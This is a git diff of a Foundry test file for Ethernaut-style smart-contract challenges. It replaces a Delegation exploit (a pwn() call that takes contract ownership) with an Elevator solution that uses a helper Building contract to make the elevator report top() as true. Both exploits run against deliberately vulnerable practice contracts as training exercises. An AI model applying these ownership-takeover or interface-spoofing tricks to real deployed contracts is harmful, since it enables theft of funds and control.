@@ -2,15 +2,19 @@
 pragma solidity ^0.6.0;
 
 import "tests/Test.sol";
-import "../../src/Delegation/Level.sol";
+import "../../src/Elevator/Level.sol";
+import "../utils/Buildling.sol";
 import "forge-std/console.sol";
 
-interface IDelegation {
-    function owner() external returns(address);
+interface IElevator {
+    function goTo(uint _floor) external;
+
+    function top() external view returns(bool);
 }
 
-contract DelegationTest is Test {
-    IDelegation delegation;
+contract ElevatorTest is Test {
+    IElevator elevator;
+    Building building;
 
     address deployer = address(100);
     address attacker = address(101);
@@ -18,8 +22,8 @@ contract DelegationTest is Test {
     function setUp() public {
         console.log(deployer, attacker);
         vm.prank(deployer); // deploy the contract as deployer
-        Delegate delegate = new Delegate(deployer);
-        delegation = IDelegation(address(new Delegation(address(delegate))));
+        elevator = IElevator(address(new Elevator()));
+        building = Building(address(new TheBuilding()));
     }
 
     function testAttack() public {
@@ -28,15 +32,13 @@ contract DelegationTest is Test {
         vm.deal(attacker, 5 ether);
 
         /* Write your code here */
-        console.log(delegation.owner());
-        (bool worked,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
-        assert(worked);
-        console.log(delegation.owner());
+        address(building).call(abi.encodeWithSignature("goTo(address,uint256)", address(elevator), 1));
         /* Write your code here */ 
 
         /* Validating the test */
-        assertEq(delegation.owner(), attacker);
+        assertTrue(elevator.top());
     }
 
 }
+
 
